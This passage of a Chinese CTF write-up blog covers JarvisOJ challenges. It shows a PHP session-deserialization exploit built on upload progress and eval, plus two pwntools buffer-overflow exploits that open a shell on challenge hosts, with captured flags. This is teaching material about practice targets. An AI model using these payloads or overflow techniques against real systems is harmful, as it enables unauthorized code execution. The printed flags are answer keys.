class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意到 session.serialize_handler ，先放一篇关于 PHP 反序列化的<a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">文章</a>。</p>
<p>PHP 内置了多种处理器用于在存取 $_SESSION 数据时，对数据进行序列化和反序列化：</p>
<table>
<thead>
<tr>
<th style="text-align:left">处理器</th>
<th style="text-align:left">存储格式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">php</td>
<td style="text-align:left">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列化的值</td>
</tr>
<tr>
<td style="text-align:left">php_binary</td>
<td style="text-align:left">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列化的值</td>
</tr>
<tr>
<td style="text-align:left">php_serialize (php&gt;=5.5.4)</td>
<td style="text-align:left">经过 serialize() 函数反序列化的数组</td>
</tr>
</tbody>
</table>
<p>漏洞产生在 php_serialize 和 php 的解析方式上。如果我们用 php_serialize 的方式构造序列化语句，然后通过 php 解析语句，会出现一些问题，因为在使用 php_serialize 构造语句时我们可以使用 ‘|’ 这个符号，但是在 php 进行解析时会将 ‘|’ 符号前的数据当作数组中的键，其后的数据当作值，这个时候我们就可以构造特殊的语句来进行利用了。</p>
<p>通过 phpinfo 页面可以获得的信息有：</p>
<ol>
<li>php 版本为 5.6.21 。</li>
<li>php.ini 中默认的 session.serialize_handler 为 php_serialize ，而 index.php 中确将它设置成了 php （这就导致了 session 反序列化的问题）。</li>
<li>session.upload_progress.enabled 的状态为 On 。</li>
<li>session.upload_progress.cleanup 为关闭状态（提高了漏洞利用成功率）。</li>
</ol>
<p>要将数据注入到 session 中，一种情况是开发者本身将用户可控的数据传进了 session （比如 joomla 等）；另一方面则可通过 php 配置不当进行 session 控制，比如 session.upload_progress.enabled is on。当这个设置打开时，php 会记录上传文件的进度，在上传时会将其信息保存在 $_SESSION 中。</p>
<p>下面开始漏洞利用。</p>
<p>首先写一个提交表单备用：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"gogogo"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>因为不知道 flag 藏在哪里，先试着获取当前目录下的文件列表。构造 payload ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(scandir(dirname(__FILE__)));'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>序列化结果为：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"OowoO"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"mdzz"</span>;<span class="attribute">s</span>:<span class="number">36</span>:<span class="string">"print_r(scandir(dirname(__FILE__)));"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>为了防止引号被转义，在前面加个杠，再把它改为 session 的格式，即在 payload 开头位置加个 ‘|’ ，修改后的 payload 如下：</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|<span class="attribute">O</span>:<span class="number">5</span>:\<span class="string">"OowoO\"</span>:<span class="number">1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:\<span class="string">"mdzz\"</span>;<span class="attribute">s</span>:<span class="number">36</span>:\<span class="string">"print_r(scandir(dirname(__FILE__)));\"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>Burp start ，利用刚刚写的提交表单随便传个东西上去，抓包，修改 filename 为 payload （开头的 ‘|’ 后面如果加了空格会导致 payload 失效，去掉就好了）：</p>
<p><img src="/posts/jarvisoj-wp/PHPINFO-1.png" alt=""></p>
<p>接下来就很简单了，去读取 Here_1s_7he_fl4g_buT_You_Cannot_see.php 就好。首先查询 PHPINFO 中的 _SERVER[“SCRIPT_FILENAME”] 得到当前目录为 /opt/lampp/htdocs/ ，将原 ‘xxx’ 处改为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(file_get_contents(<span class="string">"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"</span>));</span><br></pre></td></tr></table></figure>
<p>序列化及一些小处理后得到最终 payload ：</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:<span class="symbol">\"</span>OowoO<span class="symbol">\"</span>:1:&#123;s:4:<span class="symbol">\"</span>mdzz<span class="symbol">\"</span>;s:88:<span class="symbol">\"</span>print_r(file_get_contents(<span class="symbol">\"</span>/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php<span class="symbol">\"</span>));<span class="symbol">\"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>用同样的方式 POST 一下就好了。</p>
<p><code>CTF{4d96e37f4be998c50aa586de4ada354a}</code></p>
<hr>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h3><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9881</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d" target="_blank" rel="noopener">level0.b9ded3801d6dd36a97468e128b81a65d</a></p>
</blockquote>
<p> ida 载入，先是 main 函数：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 <span class="comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6                 public main</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 main            proc near               <span class="comment">; DATA XREF: _start+1D↑o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 var_10          = qword ptr <span class="number">-10</span>h</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 var_4           = dword ptr <span class="number">-4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6                 <span class="keyword">push</span>    rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C7                 <span class="keyword">mov</span>     rbp, rsp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>CA                 <span class="keyword">sub</span>     rsp, <span class="number">10</span>h</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>CE                 <span class="keyword">mov</span>     [rbp+var_4], edi</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>D1                 <span class="keyword">mov</span>     [rbp+var_10], rsi</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>D5                 <span class="keyword">mov</span>     edx, <span class="number">0</span>Dh        <span class="comment">; n</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>DA                 <span class="keyword">mov</span>     esi, offset aHelloWorld <span class="comment">; "Hello, World\n"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>DF                 <span class="keyword">mov</span>     edi, <span class="number">1</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005E4</span>                 <span class="keyword">call</span>    _write</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005E9</span>                 <span class="keyword">mov</span>     eax, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>EE                 <span class="keyword">call</span>    vulnerable_function</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F3                 leave</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F4                 retn</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F4 <span class="comment">; &#125; // starts at 4005C6</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F4 main            endp</span><br></pre></td></tr></table></figure>
<p>vulnerable_function 函数：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000004005A6                 <span class="meta">public</span> vulnerable_function</span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6 vulnerable_function proc <span class="built_in">near</span>           <span class="comment">; CODE XREF: main+28↓p</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6</span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6 buf             = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">80h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6</span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A7                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005AA                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">0FFFFFFFFFFFFFF80h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005AE                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+buf]</span><br><span class="line"><span class="symbol">.text:</span>00000000004005B2                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">200h</span>       <span class="comment">; nbytes</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005B7                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span>        <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005BA                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">0</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005BF                 <span class="keyword">call</span>    _read</span><br><span class="line"><span class="symbol">.text:</span>00000000004005C4                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C5                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C5 <span class="comment">; &#125; // starts at 4005A6</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C5 vulnerable_function endp</span><br></pre></td></tr></table></figure>
<p>以及一个未曾被调用但是能够打开 shell 的 callsystem 函数：</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span>                 public callsystem</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span> callsystem      proc near</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span> <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span>                 <span class="keyword">push</span>    rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400597</span>                 <span class="keyword">mov</span>     rbp, rsp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000040059</span>A                 <span class="keyword">mov</span>     edi, offset command <span class="comment">; "/bin/sh"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000040059</span>F                 <span class="keyword">call</span>    _system</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A4                 <span class="keyword">pop</span>     rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5                 retn</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5 <span class="comment">; &#125; // starts at 400596</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5 callsystem      endp</span><br></pre></td></tr></table></figure>
<p>可以利用 vulnerable_function 中的 read 函数进行缓冲区溢出，进而跳转到 callsystem 函数以 get shell 。</p>
<p>ctrl + k 查看该函数的栈帧，buf 的首地址与栈返回地址的距离差为 (+0000000000000008) - (-0000000000000080) ，即 0x88 ，callsystem 函数的地址为 0x400596 ，接下来就可以写 poc 了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9881</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line">add = p64(<span class="number">0x400596</span>)</span><br><span class="line">payload = padding + add</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>cat flag：</p>
<p><code>CTF{713ca3944e92180e0ef03171981dcd41}</code></p>
<h3 id="XMAN-level1"><a href="#XMAN-level1" class="headerlink" title="[XMAN]level1"></a>[XMAN]level1</h3><p>题目描述：</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9877</p>
<p><a href="https://dn.jarvisoj.com/challengefiles/level1.80eacdcd51aca92af7749d96efad7fb5" target="_blank" rel="noopener">level1.80eacdcd51aca92af7749d96efad7fb5</a></p>
</blockquote>
<p>checksec 一下发现什么保护都没有开，这次是一个 32 位的程序，ida 载入之：</p>
<p>main 函数：</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">080484B7</span> ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:<span class="number">080484B7</span>                 public main</span><br><span class="line">.text:<span class="number">080484B7</span> main            proc near               ; DATA XREF: _start+<span class="number">17</span>↑o</span><br><span class="line">.text:<span class="number">080484B7</span></span><br><span class="line">.text:<span class="number">080484B7</span> var_4           = dword ptr -<span class="number">4</span></span><br><span class="line">.text:<span class="number">080484B7</span> argc            = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">080484B7</span> argv            = dword ptr  <span class="number">0Ch</span></span><br><span class="line">.text:<span class="number">080484B7</span> envp            = dword ptr  10h</span><br><span class="line">.text:<span class="number">080484B7</span></span><br><span class="line">.text:<span class="number">080484B7</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">080484B7</span>                 lea     ecx, [esp+<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080484BB</span>                 <span class="keyword">and</span>     esp, <span class="number">0FFFFFFF0h</span></span><br><span class="line">.text:<span class="number">080484BE</span>                 <span class="built_in">push</span>    dword ptr [ecx-<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080484C1</span>                 <span class="built_in">push</span>    ebp</span><br><span class="line">.text:<span class="number">080484C2</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">080484C4</span>                 <span class="built_in">push</span>    ecx</span><br><span class="line">.text:<span class="number">080484C5</span>                 sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">080484C8</span>                 call    vulnerable_function</span><br><span class="line">.text:<span class="number">080484CD</span>                 sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">080484D0</span>                 <span class="built_in">push</span>    <span class="number">0Eh</span>             ; n</span><br><span class="line">.text:<span class="number">080484D2</span>                 <span class="built_in">push</span>    offset aHelloWorld ; <span class="string">"Hello, World!\n"</span></span><br><span class="line">.text:<span class="number">080484D7</span>                 <span class="built_in">push</span>    <span class="number">1</span>               ; fd</span><br><span class="line">.text:<span class="number">080484D9</span>                 call    _write</span><br><span class="line">.text:<span class="number">080484DE</span>                 add     esp, 10h</span><br><span class="line">.text:<span class="number">080484E1</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">080484E6</span>                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:<span class="number">080484E9</span>                 leave</span><br><span class="line">.text:<span class="number">080484EA</span>                 lea     esp, [ecx-<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080484ED</span>                 retn</span><br><span class="line">.text:<span class="number">080484ED</span> ; &#125; // starts <span class="built_in">at</span> <span class="number">80484B7</span></span><br><span class="line">.text:<span class="number">080484ED</span> main            endp</span><br></pre></td></tr></table></figure>
<p>在调用 vulnerable_function 函数之后 printf “Hello, World!\n”。</p>
<p>看一下 vulnerable_function 函数：</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804847B</span>                 public vulnerable_function</span><br><span class="line">.text:<span class="number">0804847B</span> vulnerable_function proc near           ; CODE XREF: main+<span class="number">11</span>↓p</span><br><span class="line">.text:<span class="number">0804847B</span></span><br><span class="line">.text:<span class="number">0804847B</span> buf             = byte ptr -88h</span><br><span class="line">.text:<span class="number">0804847B</span></span><br><span class="line">.text:<span class="number">0804847B</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0804847B</span>                 <span class="built_in">push</span>    ebp</span><br><span class="line">.text:<span class="number">0804847C</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804847E</span>                 sub     esp, 88h</span><br><span class="line">.text:<span class="number">08048484</span>                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048487</span>                 lea     eax, [ebp+buf]</span><br><span class="line">.text:<span class="number">0804848D</span>                 <span class="built_in">push</span>    eax</span><br><span class="line">.text:<span class="number">0804848E</span>                 <span class="built_in">push</span>    offset format   ; <span class="string">"What's this:%p?\n"</span></span><br><span class="line">.text:<span class="number">08048493</span>                 call    _printf</span><br><span class="line">.text:<span class="number">08048498</span>                 add     esp, 10h</span><br><span class="line">.text:<span class="number">0804849B</span>                 sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804849E</span>                 <span class="built_in">push</span>    100h            ; nbytes</span><br><span class="line">.text:<span class="number">080484A3</span>                 lea     eax, [ebp+buf]</span><br><span class="line">.text:<span class="number">080484A9</span>                 <span class="built_in">push</span>    eax             ; buf</span><br><span class="line">.text:<span class="number">080484AA</span>                 <span class="built_in">push</span>    <span class="number">0</span>               ; fd</span><br><span class="line">.text:<span class="number">080484AC</span>                 call    _read</span><br><span class="line">.text:<span class="number">080484B1</span>                 add     esp, 10h</span><br><span class="line">.text:<span class="number">080484B4</span>                 nop</span><br><span class="line">.text:<span class="number">080484B5</span>                 leave</span><br><span class="line">.text:<span class="number">080484B6</span>                 retn</span><br><span class="line">.text:<span class="number">080484B6</span> ; &#125; // starts <span class="built_in">at</span> 804847B</span><br><span class="line">.text:<span class="number">080484B6</span> vulnerable_function endp</span><br></pre></td></tr></table></figure>
<p>这个函数首先打印出 buf 的首地址，然后从标准输入获取 100 字节写入 buf 中。buf 的长度为 0x04 - (-0x88) = 0x8c &lt; 0x100 ，又因为没有开启栈保护，会造成栈溢出。</p>
<p>这样大致的思路就有了。先截取 buf 的首地址，在其中写入拿 shell 的 shellcode ，再用 buf 地址覆盖 vulnerable_function 函数的返回地址使之执行 system(“/bin/sh”) 。不过我们不知道 system 的地址，此时可以用 pwntools 中的 asm() 函数。</p>
<p>asm() 函数可以接收一个字符串作为参数，得到汇编码的机器代码。 这里我们可以用 asm(shellcraft.sh()) 的方式得到目标地址，shellcraft.sh() 就是执行 /bin/sh 的 shellcode。</p>
<p>按照 shellcode + nope*n + ret_address 这个格式就可以拿到 shell 了。</p>
<p>poc: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) </span><br><span class="line">p_buf = int(sh.recvline()[<span class="number">14</span>:<span class="number">-2</span>], <span class="number">16</span>)</span><br><span class="line"><span class="comment">#print (hex(p_buf))</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + (<span class="number">0x8c</span>-len(shellcode)) * <span class="string">'\x90'</span> + p32(p_buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>cat flag:  </p>
<p><code>CTF{82c2aa534a9dede9c3a0045d0fec8617}</code></p>

  </div>
  
  <div class="article-tags">
    
      <a class="tag-link" href="/tags/CTF/">CTF</a>
    
  </div>
    
  

</article>

      <script>document.getElementById("loading-bar").style.width="60%";</script>
    </main>
    
<footer id="footer" class="clearfix">
	
  <div>&copy; <a href="https://cyris.pen.moe">Cyris&#39;s pen</a> Theme by <a href="http://artifact.me/" target="_blank">Art Chen</a>.</div>
  <div>Powered by <a href="https://hexo.io/" rel="external">Hexo</a>.</div>
</footer>


    <script>document.getElementById("loading-bar").style.width="80%";</script>
    <div class="overlay"></div>
  </div>
  <div class="site-sidebar">

	
	
	<div class="sidebar-switch clearfix show"
		style="display: block">
		<a class="dark-btn active" data-toggle="toc">
	    <span class="icon icon-list"></span>
	    <span class="text">Index</span>
	  </a>
	  <a class="dark-btn" data-toggle="bio">
	    <span class="icon icon-person"></span>
	    <span class="text">Bio</span>
	  </a>
	</div>

	<div class="site-toc show"
		style="display: block">
		
	  	<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Login"><span class="toc-number">1.1.</span> <span class="toc-text">Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#api调用"><span class="toc-number">1.2.</span> <span class="toc-text">api调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#神盾局的秘密"><span class="toc-number">1.3.</span> <span class="toc-text">神盾局的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag在管理员手里"><span class="toc-number">1.4.</span> <span class="toc-text">flag在管理员手里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPINFO"><span class="toc-number">1.5.</span> <span class="toc-text">PHPINFO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XMAN-level0"><span class="toc-number">2.1.</span> <span class="toc-text">[XMAN]level0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMAN-level1"><span class="toc-number">2.2.</span> <span class="toc-text">[XMAN]level1</span></a></li></ol></li></ol>
	  
  </div>
  
	<div class="site-bio "
		style="display: none">
		
	  <!-- About Me -->
	  <div class="about-me clearfix">
	    <div class="avatar">
	      <img src="/img/avatar.png" />
	    </div>
	    <div class="info">
	      <a class="name dark-btn" href="/about">
	        Cyris
	      </a>
	    </div>
	    <div class="info">
	      <span class="item desc">
	        Share the world with you.
	      </span>
	    </div>
	  </div>
	
	  <!-- Social Icons -->
	  <div class="social clearfix">
	    
	      
	        <a href="/atom.xml" class="feed"
	          target="_blank" rel="external">
	          <span class="icon icon-feed"></span>
	        </a>
	      
	        <a href="https://github.com/iCyris" class="github"
	          target="_blank" rel="external">
	          <span class="icon icon-github"></span>
	        </a>
	      
	    
	  </div>
	
	  <!-- Home & Bottom -->
	  <div class="shortcuts clearfix">
	    <div class="bk">
	      <a href="#header" class="dark-btn window-nav">
	        <span class="icon icon-chevron-thin-up"></span>
	        <span class="text">Back to Top</span>
	      </a>
	    </div>
	    <div class="bk">
	      <a href="#footer" class="dark-btn window-nav">
	        <span class="icon icon-chevron-thin-down"></span>
	        <span class="text">Go to Bottom</span>
	      </a>
	    </div>
	  </div>

	</div>

</div>

  <!-- Universal Search -->

<script type="text/javascript">
	var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
	var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
	var ALGOLIA_API_KEY = "";
	var ALGOLIA_APP_ID = "";
	var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
